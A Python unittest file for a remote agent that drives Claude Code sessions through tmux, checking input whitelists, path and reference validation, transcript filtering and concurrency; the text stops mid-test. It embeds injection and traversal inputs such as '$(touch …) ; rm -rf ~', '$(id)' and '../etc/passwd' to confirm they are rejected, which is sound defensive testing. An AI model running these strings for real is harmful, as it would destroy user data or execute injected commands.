"""node_agent 测试：白名单/校验单测、源码约束、协议（EOF/空闲退出/错误请求）、transcript 过滤，
以及本机 tmux + fake_tui 的端到端（hello/start/paste/keys/capture/watch/kill/stop_keeper）。

端到端测试使用临时 HOME / TMUX_TMPDIR（/tmp 下短路径），结束时断言没有残留 tmux server、进程或文件。
"""
import ast
import json
import os
import pathlib
import queue
import re
import shutil
import subprocess
import sys
import tempfile
import threading
import time
import unittest
from unittest import mock

from ccr import agent_link, node_agent

ROOT = pathlib.Path(__file__).resolve().parent.parent
AGENT = ROOT / "ccr" / "node_agent.py"
SID = "s0123456789ab"
SID2 = "sabcdefabcdef"
UUID = "59dd443a-c637-4148-bf1c-fd720f2e5b1f"
TMUX = shutil.which("tmux") or "/opt/homebrew/bin/tmux"
HAVE_TMUX = os.path.exists(TMUX)
NASTY = "引号 'single' \"double\" `id` $(touch /tmp/ccr_pwned_na) ; rm -rf ~ & | > <\n第二行\t制表 \\ 反斜杠 ${HOME}"


def pid_alive(pid):
    try:
        os.kill(pid, 0)
    except ProcessLookupError:
        return False
    except OSError:
        return True
    # macOS/Linux：僵尸进程也算已结束
    r = subprocess.run(["ps", "-o", "stat=", "-p", str(pid)], capture_output=True, text=True)
    return r.returncode == 0 and not r.stdout.strip().startswith("Z")


class FakeEnv:
    """一套隔离的 fake 环境：临时 HOME、TMUX_TMPDIR、本机 tmux keeper。"""

    def __init__(self, **fake_env):
        self.base = os.path.realpath(tempfile.mkdtemp(prefix="ccrna", dir="/tmp"))
        fe = {"CCR_FAKE_DELAY": "0.05", "CCR_FAKE_THINK": "0.2"}
        fe.update(fake_env)
        self.cfg = {"fake": True, "fake_home": os.path.join(self.base, "home"),
                    "fake_tmpdir": os.path.join(self.base, "t"), "fake_tmux": TMUX, "fake_env": fe}
        self.env = agent_link.fake_env(self.cfg)
        for d in (self.env["HOME"], self.env["TMUX_TMPDIR"]):
            os.makedirs(d, mode=0o700)
        self.pids = set()

    def tmux(self, *args):
        return subprocess.run([TMUX, "-L", "ccr", "-f", "/dev/null"] + list(args), env=self.env,
                              capture_output=True, text=True, timeout=20)

    def start_keeper(self):
        r = self.tmux("new-session", "-d", "-s", "_ccr_keeper", "sleep", "2147483647")
        assert r.returncode == 0, r.stderr
        self.track_server()

    def track_server(self):
        r = self.tmux("display-message", "-p", "-t", "=_ccr_keeper:", "#{pid} #{pane_pid}")
        for x in r.stdout.split():
            if x.isdigit():
                self.pids.add(int(x))

    def server_alive(self):
        return self.tmux("list-sessions").returncode == 0

    def cleanup(self, test):
        self.tmux("kill-server")
        deadline = time.time() + 10
        while time.time() < deadline and (self.server_alive() or any(pid_alive(p) for p in self.pids)):
            time.sleep(0.1)
        left = [p for p in self.pids if pid_alive(p)]
        alive = self.server_alive()
        shutil.rmtree(self.base, ignore_errors=True)
        test.assertFalse(alive, "tmux server 残留")
        test.assertEqual(left, [], "进程残留")
        test.assertFalse(os.path.exists(self.base), "临时文件残留")


class AgentProc:
    """直接以子进程运行 node_agent.py（与 AgentLink 的 fake 模式相同的命令行）。"""

    def __init__(self, env, extra_env=None):
        e = dict(env)
        e.update(extra_env or {})
        self.p = subprocess.Popen([sys.executable, "-I", "-u", str(AGENT)], stdin=subprocess.PIPE,
                                  stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=e, bufsize=0)
        self.q = queue.Queue()
        self.events = []
        self.lock = threading.Lock()
        self.ids = 0
        self.t = threading.Thread(target=self._read, daemon=True)
        self.t.start()

    def _read(self):
        for line in iter(self.p.stdout.readline, b""):
            msg = json.loads(line)
            if "ev" in msg:
                with self.lock:
                    self.events.append(msg)
            else:
                self.q.put(msg)

    def send_raw(self, data: bytes):
        self.p.stdin.write(data)
        self.p.stdin.flush()

    def call(self, op, timeout=20, **params):
        self.ids += 1
        msg = dict(params, id=self.ids, op=op)
        self.send_raw((json.dumps(msg, ensure_ascii=False) + "\n").encode())
        resp = self.q.get(timeout=timeout)
        assert resp["id"] == self.ids, resp
        return resp

    def ok(self, op, **params):
        r = self.call(op, **params)
        assert r["ok"], r
        return r["result"]

    def err(self, op, **params):
        r = self.call(op, **params)
        assert not r["ok"], r
        return r["error"]

    def wait_event(self, pred, timeout=15):
        deadline = time.time() + timeout
        seen = 0
        while time.time() < deadline:
            with self.lock:
                evs = self.events[seen:]
            for e in evs:
                if pred(e):
                    return e
            seen += len(evs)
            time.sleep(0.05)
        raise AssertionError("等待事件超时；最近事件：%r" % ([e.get("ev") for e in self.events[-10:]],))

    def screen_has(self, sid, text, timeout=15):
        return self.wait_event(lambda e: e["ev"] == "screen" and e["sid"] == sid and text in e["text"], timeout)

    def close(self):
        try:
            self.p.stdin.close()
        except OSError:
            pass
        rc = self.p.wait(10)
        self.t.join(5)
        self.p.stdout.close()
        self.p.stderr.close()
        return rc


# ---------------------------------------------------------------- 单测
class ValidationTests(unittest.TestCase):
    def test_args_whitelist(self):
        ok = [[], ["--resume", UUID], ["--model", "opus"], ["--model", "claude-opus-5-5[1m]"],
              ["--permission-mode", "plan"], ["--dangerously-skip-permissions"], ["--effort", "xhigh"],
              ["--resume", UUID, "--model", "sonnet", "--permission-mode", "bypassPermissions",
               "--dangerously-skip-permissions", "--effort", "max"]]
        for a in ok:
            self.assertEqual(node_agent.validate_args(a), a)
        for m in ("acceptEdits", "auto", "bypassPermissions", "manual", "dontAsk", "plan"):
            node_agent.validate_args(["--permission-mode", m])
        bad = [["-p"], ["--print"], ["--settings", "{}"], ["--plugin-dir", "/x"], ["--append-system-prompt", "x"],
               ["--system-prompt", "x"], ["--mcp-config", "x"], ["--session-id", UUID], ["--model=opus"],
               ["--model"], ["--model", "-p"], ["--model", "a b"], ["--model", "$(id)"], ["--model", "x;id"],
               ["--model", "a\nb"], ["--model", "x" * 81], ["--model", "opus", "--model", "haiku"],
               ["--permission-mode", "default"], ["--permission-mode", "plan;id"], ["--effort", "ultra"],
               ["--effort"], ["--resume", "x"], ["--resume", UUID + "0"], ["--resume", "../" + UUID],
               ["--dangerously-skip-permissions", "--dangerously-skip-permissions"], ["opus"], [1], "--model x",
               [None], ["--output-format", "stream-json"], ["--input-format", "stream-json"], ["--verbose"]]
        for a in bad:
            with self.assertRaises(node_agent.OpError, msg=repr(a)):
                node_agent.validate_args(a)

    def test_keys_whitelist(self):
        # C-v：claude 自己的"粘贴剪贴板图片"，只由 session.paste_image（本机会话、用户 ⌘V 粘贴图片）发送；
        # x / C-k：停止子代理（底部列表 x、Ctrl+X Ctrl+K），只能带 guard 以固定序列发送（tests/test_tuiact.py）
        self.assertEqual(node_agent.KEYS, frozenset(
            "Enter Escape Up Down Left Right Tab BTab BSpace Space C-c C-u C-b C-x C-s C-v C-k "
            "1 2 3 4 5 6 7 8 9 s y n x".split()))

    def test_sid(self):
        self.assertEqual(node_agent.check_sid({"sid": SID}), SID)
        for bad in ("", "s0123", "S0123456789ab", "s0123456789abc", "s0123456789a;", "s0123456789ab\n",
                    "ccr-" + SID, None, 5, "_ccr_keeper"):
            with self.assertRaises(node_agent.OpError, msg=repr(bad)):
                node_agent.check_sid({"sid": bad})
        self.assertEqual(node_agent.target(SID), "=ccr-" + SID + ":")

    def test_resolve_cwd(self):
        with tempfile.TemporaryDirectory(dir="/tmp") as td:
            td = os.path.realpath(td)
            nasty = os.path.join(td, "it's $(id) `x` 中文")
            os.makedirs(nasty)
            with mock.patch.dict(os.environ, {"HOME": td}):
                self.assertEqual(node_agent.resolve_cwd("~"), td)
                self.assertEqual(node_agent.resolve_cwd("~/it's $(id) `x` 中文/"), nasty)
                self.assertEqual(node_agent.resolve_cwd(nasty), nasty)
                for bad in ("", "rel", "~root", "/nonexistent/ccr", td + "/a\nb", td + "\x00", None, 3,
                            "/" + "a" * 5000):
                    with self.assertRaises(node_agent.OpError, msg=repr(bad)):
                        node_agent.resolve_cwd(bad)

    def test_claude_command_real_vs_fake(self):
        with mock.patch.object(node_agent, "FAKE", False):
            self.assertEqual(node_agent.claude_command(), ["bash", "-l", "-i", "-c", 'exec claude "$@"', "claude"])
        with mock.patch.object(node_agent, "FAKE", True), \
                mock.patch.dict(os.environ, {"CCR_CLAUDE_CMD": "/usr/bin/python3 -I '/a b/fake_tui.py'"}):
            self.assertEqual(node_agent.claude_command(), ["/usr/bin/python3", "-I", "/a b/fake_tui.py"])

    def test_real_mode_ignores_fake_env(self):
        """真实模式绝不读取 CCR_CLAUDE_CMD / CCR_FAKE_TMUX。"""
        with tempfile.TemporaryDirectory(dir="/tmp") as td:
            env = {"PATH": "/usr/bin:/bin", "HOME": td, "CCR_CLAUDE_CMD": "/bin/echo pwned",
                   "CCR_FAKE_TMUX": "/bin/echo", "CCR_FAKE": "0"}
            code = ("import sys; sys.path.insert(0, %r); import node_agent as n; print(n.FAKE, n.claude_command())"
                    % str(AGENT.parent))
            r = subprocess.run([sys.executable, "-I", "-c", code], env=env, capture_output=True, text=True)
            self.assertEqual(r.stdout.strip(), "False ['bash', '-l', '-i', '-c', 'exec claude \"$@\"', 'claude']")


class SourceTests(unittest.TestCase):
    SRC = AGENT.read_text(encoding="utf-8")

    def test_python38_syntax_and_stdlib_only(self):
        tree = ast.parse(self.SRC, feature_version=(3, 8))
        mods = set()
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                mods |= {a.name.split(".")[0] for a in node.names}
            elif isinstance(node, ast.ImportFrom):
                mods.add((node.module or "").split(".")[0])
        self.assertNotIn("ccr", mods)
        stdlib = set(getattr(sys, "stdlib_module_names", mods))
        self.assertTrue(mods <= stdlib, mods - stdlib)
        self.assertNotIn("from __future__", self.SRC)

    # 唯一允许写文件的地方：API key 文件（~/.cc-remote-chat/keys/<指纹>.json）及其私有目录
    KEY_WRITERS = ("_open_private_dir", "write_key_file")

    def test_never_writes_files_or_env(self):
        tree = ast.parse(self.SRC)
        writers = [n for n in tree.body if isinstance(n, ast.FunctionDef) and n.name in self.KEY_WRITERS]
        self.assertEqual(sorted(n.name for n in writers), sorted(self.KEY_WRITERS))
        inside = {id(x) for w in writers for x in ast.walk(w)}
        write_attrs = ("mkdir", "fchmod", "fsync", "O_CREAT", "O_WRONLY", "O_TRUNC", "O_RDWR", "O_APPEND")
        for node in ast.walk(tree):
            if isinstance(node, ast.Call) and getattr(node.func, "id", None) == "open":
                mode = node.args[1].value if len(node.args) > 1 else "r"
                self.assertEqual(mode, "rb", ast.dump(node))
            if isinstance(node, ast.Attribute):
                self.assertNotIn(node.attr, ("putenv", "unsetenv", "makedirs", "remove", "unlink",
                                             "rename", "replace", "rmtree", "chmod", "write_text"))
                if id(node) not in inside:
                    self.assertNotIn(node.attr, write_attrs, "只有 %s 可以写文件" % (self.KEY_WRITERS,))
            if isinstance(node, (ast.Assign, ast.AugAssign)):
                targets = node.targets if isinstance(node, ast.Assign) else [node.target]
                for t in targets:
                    self.assertNotIn("environ", ast.dump(t))
        self.assertNotIn("shell=True", self.SRC)
        self.assertNotIn("os.system", self.SRC)
        # 写 key 文件：O_CREAT|O_WRONLY|O_TRUNC|O_NOFOLLOW、0600、相对于已校验的目录 fd
        w = ast.get_source_segment(self.SRC, writers[[n.name for n in writers].index("write_key_file")])
        self.assertIn("os.O_CREAT | os.O_WRONLY | os.O_TRUNC | O_NOFOLLOW, 0o600, dir_fd=dfd", w)
        self.assertNotIn(".claude", w)

    def test_tmux_always_private_socket(self):
        self.assertIn('[resolve_tmux(), "-L", TMUX_LABEL, "-f", "/dev/null"]', self.SRC)
        # 标签默认 ccr；只有本机模式（--local）才解析 --tmux-label（内置模式 ccr-app），远端永远是 ccr
        self.assertIn('DEFAULT_TMUX_LABEL = "ccr"\n', self.SRC)
        self.assertIn("ARG_TMUX, TMUX_LABEL = parse_local_opts(sys.argv[1:]) if LOCAL else (None, DEFAULT_TMUX_LABEL)",
                      self.SRC)
        # 除 -V 外所有 tmux 调用都经 tmux() 包装
        self.assertEqual(len(re.findall(r"\[resolve_tmux\(\), ", self.SRC)), 2)


class TranscriptTests(unittest.TestCase):
    def setUp(self):
        self.td = os.path.realpath(tempfile.mkdtemp(dir="/tmp"))
        self.proj = os.path.join(self.td, ".claude", "projects", "-x")
        os.makedirs(self.proj)
        self.envp = mock.patch.dict(os.environ, {"HOME": self.td})
        self.envp.start()
        self.out = []
        self.emitp = mock.patch.object(node_agent, "emit", self.out.append)
        self.emitp.start()
        self.w = node_agent.Watched(SID)
        self.watcher = node_agent.Watcher.__new__(node_agent.Watcher)

    def tearDown(self):
        self.emitp.stop()
        self.envp.stop()
        shutil.rmtree(self.td)

    def write(self, uid, lines, mode="ab"):
        with open(os.path.join(self.proj, uid + ".jsonl"), mode) as f:
            f.write(lines)

    def poll(self, uid=UUID):
        self.out.clear()
        self.watcher.poll_transcript(self.w, uid, "/x")
        return list(self.out)

    def test_filter_partial_lines_truncate_batches(self):
        ents = [
            {"type": "user", "uuid": "1", "message": {"role": "user", "content": "hi"}},
            {"type": "attachment", "uuid": "2"},
            {"type": "assistant", "uuid": "3", "isSidechain": True},
            {"type": "system", "uuid": "4", "content": "x" * 25000, "nested": [{"s": "y" * 30000}]},
            {"type": "mode", "mode": "normal"},
            {"type": "assistant", "uuid": "5", "isMeta": True},
        ]
        data = "".join(json.dumps(e) + "\n" for e in ents).encode() + b"not json\n"
        self.write(UUID, data + b'{"type":"user","uuid":"6"')  # 最后一行不完整
        evs = self.poll()
        self.assertEqual(len(evs), 1)
        ev = evs[0]
        self.assertEqual((ev["ev"], ev["sid"], ev["session_id"], ev["reset"]), ("transcript", SID, UUID, True))
        self.assertEqual([e["uuid"] for e in ev["entries"]], ["1", "4", "5"])
        big = ev["entries"][1]
        self.assertTrue(big["truncated"])
        self.assertEqual(len(big["content"]), 20000)
        self.assertEqual(len(big["nested"][0]["s"]), 20000)
        self.assertNotIn("truncated", ev["entries"][0])
        self.assertEqual(self.poll(), [])  # 没有新完整行
        self.write(UUID, b',"message":{"role":"user","content":"ok"}}\n')
        evs = self.poll()
        self.assertEqual([e["uuid"] for e in evs[0]["entries"]], ["6"])
        self.assertFalse(evs[0]["reset"])
        # 一次 650 条：分 3 批，只有第一批 reset（这里不是首次，全为 False）
        self.write(UUID, "".join(json.dumps({"type": "user", "uuid": str(i)}) + "\n" for i in range(650)).encode())
        evs = self.poll()
        self.assertEqual([len(e["entries"]) for e in evs], [300, 300, 50])
        self.assertEqual([e["reset"] for e in evs], [False, False, False])

    def test_switch_session_and_missing_file(self):
        other = "11111111-2222-3333-4444-555555555555"
        self.write(UUID, b'{"type":"user","uuid":"a"}\n')
        self.assertTrue(self.poll()[0]["reset"])
        evs = self.poll(other)  # /clear：新 sessionId，文件还没出现 → reset + 空 entries
        self.assertEqual([(e["session_id"], e["reset"], e["entries"]) for e in evs], [(other, True, [])])
        self.assertEqual(self.poll(other), [])
        self.write(other, b'{"type":"assistant","uuid":"b"}\n')
        self.w.next_tfind = 0
        evs = self.poll(other)
        self.assertEqual([(e["reset"], [x["uuid"] for x in e["entries"]]) for e in evs], [(False, ["b"])])
        # 文件被截断重写 → reset 并从头发送
        self.write(other, b'{"type":"user","uuid":"c"}\n', mode="wb")
        evs = self.poll(other)
        self.assertEqual([(e["reset"], [x["uuid"] for x in e["entries"]]) for e in evs], [(True, ["c"])])

    def test_find_transcript_rejects_bad_ids(self):
        self.write(UUID, b"")
        self.assertEqual(node_agent.find_transcript(UUID, "/nope"), os.path.join(self.proj, UUID + ".jsonl"))
        for bad in ("*", "../x", UUID + "/../x", None):
            self.assertIsNone(node_agent.find_transcript(bad))


def big_b64(n=24000, seed=b"img"):
    """确定性的“大图片” base64（内容不必是真图片：agent 只做引用与 hash 校验）。"""
    import base64
    import hashlib
    raw = b"".join(hashlib.sha256(seed + str(i).encode()).digest() for i in range(n * 3 // 4 // 32 + 1))
    return base64.b64encode(raw).decode()[:n // 4 * 4]


class ImageRefTests(unittest.TestCase):
    """大图片 → ccr_ref 引用；blob op 按引用重读并校验（只读该会话自己的文件）。"""

    def setUp(self):
        self.td = os.path.realpath(tempfile.mkdtemp(dir="/tmp"))
        self.proj = os.path.join(self.td, ".claude", "projects", "-x")
        os.makedirs(self.proj)
        self.envp = mock.patch.dict(os.environ, {"HOME": self.td})
        self.envp.start()
        self.out = []
        self.emitp = mock.patch.object(node_agent, "emit", self.out.append)
        self.emitp.start()
        self.w = node_agent.Watched(SID)
        self.watcher = node_agent.Watcher.__new__(node_agent.Watcher)
        node_agent._known.clear()
        self.big1, self.big2, self.big3 = big_b64(seed=b"a"), big_b64(30000, b"b"), big_b64(17000, b"c")
        self.small = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg=="
        img = lambda d, mt="image/png": {"type": "image", "source": {"type": "base64", "media_type": mt, "data": d}}
        self.ents = [
            {"type": "assistant", "uuid": "u0", "message": {"role": "assistant", "content": [
                {"type": "tool_use", "id": "t1", "name": "mcp__chrome-devtools__take_screenshot", "input": {}}]}},
            # MCP 截图：tool_result.content = [text, image, text]，toolUseResult 是同样的列表
            {"type": "user", "uuid": "u1", "message": {"role": "user", "content": [
                {"tool_use_id": "t1", "type": "tool_result", "content": [
                    {"type": "text", "text": "Took a screenshot"}, img(self.big1), {"type": "text", "text": "[Image: …]"}]}]},
             "toolUseResult": [{"type": "text", "text": "Took a screenshot"}, img(self.big1)]},
            # Read 图片：content=[image]，toolUseResult.file.base64 重复一份
            {"type": "user", "uuid": "u2", "message": {"role": "user", "content": [
                {"tool_use_id": "t2", "type": "tool_result", "content": [img(self.big2)]}]},
             "toolUseResult": {"type": "image", "file": {"base64": self.big2, "type": "image/png", "originalSize": 9}}},
            # 用户粘贴的图片 + 小图继续内联
            {"type": "user", "uuid": "u3", "message": {"role": "user", "content": [
                {"type": "text", "text": "看图"}, img(self.big3, "image/jpeg"), img(self.small)]}},
            {"type": "user", "uuid": "u4", "message": {"role": "user", "content": "x"},
             "toolUseResult": {"filePath": "/a", "originalFile": "o" * 30000, "structuredPatch": []}},
        ]
        self.lines = [(json.dumps(e) + "\n").encode() for e in self.ents]

    def tearDown(self):
        self.emitp.stop()
        self.envp.stop()
        node_agent._known.clear()
        shutil.rmtree(self.td)

    def write(self, data, name=UUID + ".jsonl"):
        with open(os.path.join(self.proj, name), "ab") as f:
            f.write(data)

    def poll(self):
        self.out.clear()
        self.watcher.poll_transcript(self.w, UUID, "/x")
        return [e for ev in self.out if ev["ev"] == "transcript" for e in ev["entries"]]

    def test_refs_offsets_and_dropped_dups(self):
        self.write(b"".join(self.lines[:2]))
        self.write(self.lines[2][:50])                    # 半行：先不转发
        got = self.poll()
        self.write(self.lines[2][50:] + b"".join(self.lines[3:]))
        got += self.poll()
        self.assertEqual([e["uuid"] for e in got], ["u0", "u1", "u2", "u3", "u4"])
        for e in got:
            self.assertNotIn("truncated", e, e["uuid"])    # 图片不再被截断
        self.assertLess(len(json.dumps(got)), 4000)
        offs = [0]
        for ln in self.lines:
            offs.append(offs[-1] + len(ln))
        s1 = got[1]["message"]["content"][0]["content"][1]["source"]
        self.assertEqual(s1["type"], "ccr_ref")
        self.assertEqual(s1["media_type"], "image/png")
        self.assertEqual(s1["ref"], "m.%s.%d.0-1.%s" % (UUID, offs[1], hashlib_hex(self.big1)))
        self.assertEqual(s1["bytes"], len(base64_decode(self.big1)))
        self.assertEqual(got[1]["toolUseResult"][1]["source"], {"type": "ccr_dropped", "media_type": "image/png"})
        s2 = got[2]["message"]["content"][0]["content"][0]["source"]
        self.assertEqual(s2["ref"].split(".")[2:4], [str(offs[2]), "0-0"])
        self.assertNotIn("base64", got[2]["toolUseResult"]["file"])
        self.assertEqual(got[2]["toolUseResult"]["file"]["originalSize"], 9)
        c3 = got[3]["message"]["content"]
        self.assertEqual(c3[1]["source"]["ref"].split(".")[2:4], [str(offs[3]), "1"])
        self.assertEqual(c3[1]["source"]["media_type"], "image/jpeg")
        self.assertEqual(c3[2]["source"], {"type": "base64", "media_type": "image/png", "data": self.small})
        self.assertIsNone(got[4]["toolUseResult"]["originalFile"])
        # blob：按引用取回原始 base64（sessionId 已在监视中记下）
        for src, data in ((s1, self.big1), (s2, self.big2), (c3[1]["source"], self.big3)):
            r = node_agent.op_blob({"sid": SID, "ref": src["ref"]})
            self.assertEqual(r["data"], data)
        self.assertEqual(node_agent.op_blob({"sid": SID, "ref": c3[1]["source"]["ref"]})["media_type"], "image/jpeg")

    def test_blob_rejects_forged_and_foreign_refs(self):
        self.write(b"".join(self.lines))
        got = self.poll()
        ref = got[1]["message"]["content"][0]["content"][1]["source"]["ref"]
        kind, sess, off, path, h = ref.split(".")

        def err(params, code=None):
            with self.assertRaises(node_agent.OpError) as cm:
                node_agent.op_blob(params)
            if code:
                self.assertEqual(cm.exception.code, code, str(cm.exception))
            return cm.exception

        err({"sid": SID, "ref": ".".join([kind, sess, off, path, "0" * 16])}, "mismatch")      # hash 不符
        err({"sid": SID, "ref": ".".join([kind, sess, "0", path, h])}, "mismatch")             # 偏移指向别的行
        err({"sid": SID, "ref": ".".join([kind, sess, off, "0-2", h])}, "mismatch")            # 块路径不对
        err({"sid": SID2, "ref": ref}, "forbidden")                                            # 别的会话
        other = "11111111-2222-3333-4444-555555555555"
        self.write(b"".join(self.lines), name=other + ".jsonl")
        err({"sid": SID, "ref": ".".join([kind, other, off, path, h])}, "forbidden")           # 未见过的 sessionId
        # 本地随请求给出当前 claude sessionId（app 重启后 agent 还没见过）时允许
        node_agent._known.clear()
        err({"sid": SID, "ref": ref}, "forbidden")
        self.assertEqual(node_agent.op_blob({"sid": SID, "ref": ref, "session_id": UUID})["data"], self.big1)
        for bad in (None, 5, "", "x" * 300, "m." + sess, "m.../../etc/passwd.0.0." + h, "m.%s.-1.0.%s" % (sess, h),
                    "m.%s.%s.0.%s" % ("../" + sess[3:], off, h), "m.%s.%s.0/1.%s" % (sess, off, h),
                    "m.%s.%s.0.%s" % (sess, off, h.upper()), "a.%s.%s.0.%s" % (sess, off, h),
                    "a.%s.ag/x.%s.0.%s" % (sess, off, h), "q.%s.%s.0.%s" % (sess, off, h),
                    "m.%s.%s.0-1-2.%s" % (sess, off, h), "m.%s.1e5.0.%s" % (sess, h)):
            err({"sid": SID, "ref": bad})
        err({"sid": "../x", "ref": ref})

    def test_subagent_refs_and_symlink_refused(self):
        self.write(self.lines[0])
        self.poll()
        sub = os.path.join(self.proj, UUID, "subagents")
        os.makedirs(sub)
        aid = "a43d26d5725-x_1"
        e = dict(self.ents[1], isSidechain=True, agentId=aid)
        line = (json.dumps(e) + "\n").encode()
        first = b'{"type":"user","uuid":"s0","isSidechain":true,"message":{"role":"user","content":"go"}}\n'
        with open(os.path.join(sub, "agent-%s.jsonl" % aid), "wb") as f:
            f.write(first + line)
        self.w.next_subscan = 0
        self.out.clear()
        self.watcher.poll_transcript(self.w, UUID, "/x")
        ents = [x for ev in self.out if ev["ev"] == "subagent" for x in ev["entries"]]
        self.assertEqual([x["uuid"] for x in ents], ["s0", "u1"])
        ref = ents[1]["message"]["content"][0]["content"][1]["source"]["ref"]
        self.assertTrue(ref.startswith("a.%s.%s.%d.0-1." % (UUID, aid, len(first))), ref)
        self.assertEqual(node_agent.op_blob({"sid": SID, "ref": ref})["data"], self.big1)
        # 子代理文件换成软链接：O_NOFOLLOW 拒绝
        real = os.path.join(self.td, "elsewhere.jsonl")
        os.rename(os.path.join(sub, "agent-%s.jsonl" % aid), real)
        os.symlink(real, os.path.join(sub, "agent-%s.jsonl" % aid))
        with self.assertRaises(node_agent.OpError):
            node_agent.op_blob({"sid": SID, "ref": ref})

    def test_filter_entry_without_ref_keeps_old_behaviour(self):
        e = node_agent.filter_entry(self.lines[1])
        self.assertTrue(e["truncated"])
        self.assertEqual(e["message"]["content"][0]["content"][1]["source"]["type"], "base64")


class BlobConcurrencyTests(unittest.TestCase):
    """blob 不阻塞主循环：在独立线程执行（最多 2 个并发），期间 ping / capture 等请求照常立即响应。"""

    def setUp(self):
        self.out = []
        self.lock = threading.Lock()

        def emit(obj):
            with self.lock:
                self.out.append(obj)
        p = mock.patch.object(node_agent, "emit", emit)
        p.start()
        self.addCleanup(p.stop)

    def ids(self):
        with self.lock:
            return [o.get("id") for o in self.out]

    def wait_ids(self, want, timeout=5):
        deadline = time.time() + timeout
        while time.time() < deadline:
            if set(want) <= set(self.ids()):
                return
            time.sleep(0.01)
        self.fail("等待响应 %r 超时：%r" % (want, self.ids()))

    def test_blob_off_main_loop_and_bounded(self):
        gate = threading.Event()
        running, peak = [0], [0]
        lk = threading.Lock()

        def slow_blob(p):
            with lk:
                running[0] += 1
                peak[0] = max(peak[0], running[0])
            gate.wait(5)
            with lk:
                running[0] -= 1
            return {"media_type": "image/png", "data": "QUJD"}

        def capture(p):
            return {"text": "screen"}
        with mock.patch.dict(node_agent.OPS, {"blob": slow_blob, "capture": capture}):
            t0 = time.time()
            for i in range(1, 5):   # 4 个 blob 同时到达
                node_agent.handle(json.dumps({"id": i, "op": "blob", "sid": SID, "ref": "r"}).encode())
            self.assertLess(time.time() - t0, 0.5)                    # handle 立即返回，不等 blob
            node_agent.handle(b'{"id":10,"op":"ping"}')
            node_agent.handle(json.dumps({"id": 11, "op": "capture", "sid": SID}).encode())
            self.assertEqual(self.ids(), [10, 11])                    # blob 进行中，ping / capture 已响应
            time.sleep(0.2)
            self.assertEqual(peak[0], 2)                              # 最多 2 个 blob 并发
            gate.set()
            self.wait_ids([1, 2, 3, 4])
        for o in self.out:
            self.assertTrue(o["ok"], o)
        self.assertEqual(node_agent._async_pending[0], 0)

    def test_blob_queue_limit_and_errors(self):
        gate = threading.Event()

        def slow_blob(p):
            gate.wait(5)
            if p.get("ref") == "bad":
                raise node_agent.OpError("图片内容校验失败", code="mismatch")
            return {}
        with mock.patch.dict(node_agent.OPS, {"blob": slow_blob}):
            n = node_agent.MAX_BLOB_QUEUE
            for i in range(n):
                node_agent.handle(json.dumps({"id": i + 1, "op": "blob", "ref": "bad" if i == 0 else "ok"}).encode())
            node_agent.handle(json.dumps({"id": 99, "op": "blob", "ref": "ok"}).encode())   # 超出排队上限
            self.wait_ids([99])
            busy = [o for o in self.out if o["id"] == 99][0]
            self.assertEqual((busy["ok"], busy["code"]), (False, "busy"))
            gate.set()
            self.wait_ids(list(range(1, n + 1)))
        first = [o for o in self.out if o["id"] == 1][0]
        self.assertEqual((first["ok"], first["code"]), (False, "mismatch"))
        self.assertEqual(node_agent._async_pending[0], 0)


class ReadLineAtTests(unittest.TestCase):
    """blob 按块读到换行为止：不会先读满 48MB 上限。"""

    def setUp(self):
        self.td = os.path.realpath(tempfile.mkdtemp(dir="/tmp"))
        self.addCleanup(shutil.rmtree, self.td)
        self.path = os.path.join(self.td, "t.jsonl")
        with open(self.path, "wb") as f:
            f.write(b'{"a":1}\n' + b"x" * (8 * 1024 * 1024) + b"\n" + b"tail-without-newline")

    def test_reads_only_needed_bytes(self):
        real_read = os.read
        got = [0]

        def counting_read(fd, n):
            b = real_read(fd, n)
            got[0] += len(b)
            return b
        with mock.patch.object(node_agent.os, "read", counting_read):
            size, line = node_agent.read_line_at(self.path, 0, node_agent.MAX_BLOB_LINE)
        self.assertEqual(line, b'{"a":1}')
        self.assertLessEqual(got[0], node_agent.BLOB_CHUNK)           # 只读了一块
        size, line = node_agent.read_line_at(self.path, 8, node_agent.MAX_BLOB_LINE)
        self.assertEqual(len(line), 8 * 1024 * 1024)                   # 跨多块的长行完整读出
        self.assertEqual(node_agent.read_line_at(self.path, 8, 1024 * 1024)[1], None)   # 超过上限仍无换行
        tail = 8 + 8 * 1024 * 1024 + 1
        self.assertEqual(node_agent.read_line_at(self.path, tail, 1 << 20)[1], None)   # 到文件尾都没有换行
        self.assertEqual(node_agent.read_line_at(self.path, size + 5, 1 << 20)[1], None)
        os.symlink(self.path, self.path + ".lnk")
        self.assertIsNone(node_agent.read_line_at(self.path + ".lnk", 0, 1 << 20))   # O_NOFOLLOW
        self.assertIsNone(node_agent.read_line_at(self.td, 0, 1 << 20))               # 不是普通文件


def hashlib_hex(s):
    import hashlib
    return hashlib.sha256(s.encode()).hexdigest()[:16]


def base64_decode(s):
    import base64
    return base64.b64decode(s)


class ProcessTreeTests(unittest.TestCase):
    def test_find_claude_in_descendants(self):
        with tempfile.TemporaryDirectory(dir="/tmp") as td:
            p = subprocess.Popen(["sh", "-c", "sleep 30 & wait"], stderr=subprocess.DEVNULL)
            try:
                deadline = time.time() + 5
                kids = []
                while time.time() < deadline and not kids:
                    kids = node_agent.child_map().get(p.pid, [])
                    time.sleep(0.05)
                self.assertEqual(len(kids), 1)
                self.assertIn(kids[0], node_agent.descendants(p.pid))
                os.makedirs(os.path.join(td, ".claude", "sessions"))
                with open(os.path.join(td, ".claude", "sessions", "%d.json" % kids[0]), "w") as f:
                    json.dump({"pid": kids[0], "sessionId": UUID, "status": "busy", "cwd": "/w",
                               "kind": "interactive", "entrypoint": "cli", "extra": 1}, f)
                with mock.patch.dict(os.environ, {"HOME": td}):
                    pid, data = node_agent.find_claude(p.pid)
                self.assertEqual(pid, kids[0])
                self.assertEqual(data, {"pid": kids[0], "sessionId": UUID, "status": "busy", "cwd": "/w",
                                        "kind": "interactive", "entrypoint": "cli"})
            finally:
                subprocess.run(["pkill", "-P", str(p.pid)])
                p.kill()
                p.wait()


class ProtocolTests(unittest.TestCase):
    def env(self, td, **extra):
        e = {"PATH": os.environ.get("PATH", "/usr/bin:/bin"), "HOME": td, "CCR_FAKE": "1",
             "CCR_FAKE_TMUX": TMUX, "TMUX_TMPDIR": td}
        e.update(extra)
        return e

    def test_eof_exits_and_bad_requests(self):
        with tempfile.TemporaryDirectory(dir="/tmp") as td:
            a = AgentProc(self.env(td))
